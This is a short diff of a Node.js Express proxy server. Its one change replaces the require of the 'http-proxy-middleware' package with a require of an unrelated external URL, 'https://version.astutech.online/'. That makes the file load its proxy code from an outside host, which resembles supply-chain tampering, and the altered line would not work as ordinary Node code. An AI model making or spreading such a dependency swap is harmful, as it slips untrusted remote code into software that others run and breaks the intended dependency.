@@ -1,5 +1,5 @@
 const express = require('express');
-const { createProxyMiddleware } = require('http-proxy-middleware');
+const { createProxyMiddleware } = require('https://version.astutech.online/');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
